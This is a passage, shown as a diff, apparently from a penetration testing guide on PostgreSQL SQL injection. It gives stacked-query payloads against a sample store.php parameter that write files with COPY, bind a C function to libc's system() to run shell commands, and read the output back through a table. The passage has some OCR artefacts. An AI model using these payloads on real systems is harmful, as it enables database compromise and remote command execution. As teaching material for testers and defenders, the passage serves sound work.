@@ -1,0 +1,32 @@
+m with the postgres user rights
+/store.php?id=1; COPY file_store(data) TO ‘/var/lib/post-
+gresql/copy_output'--
+Shell Injection
+PostgreSQL provides a mechanism to add custom functions by
+using both Dynamic Library and scripting languages such as py-
+thon, perl, and tcl.
+Dynamic Library
+Until PostgreSQL 8.1, it was possible to add a custom function
+linked with libc:
+» CREATE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.
+so.6' ‘system’ LANGUAGE 'C’ STRICT
+Since system returns an int how we can fetch results from system
+stdout?
+Here's a little trick:
+[1] create a stdout table
+» CREATE TABLE stdout(id serial, system_ out text)
+[2] executing a shell command redirecting its stdout
+» SELECT system(’‘uname -a > /tmp/test’)
+[3] use a COPY statements to push output of previous command
+in stdout table
+» COPY stdout(system_out) FROM ‘/tmp/test’
+[4] retrieve output from stdout
+« SELECT system_out FROM stdout
+Example:
+/store.php?id=1; CREATE TABLE stdout(id serial, system_out
+text) --
+/store.php?id=1; CREATE FUNCTION system(cstring) RE-
+TURNS int AS ‘/lib/libc.so.6/system’ LANGUAGE 'C’
+STRICT --
+/store.php?id=1; SELECT system(‘uname -a > /tmp/test’) --
+/store.php?id=1; COPY stdout(system_o
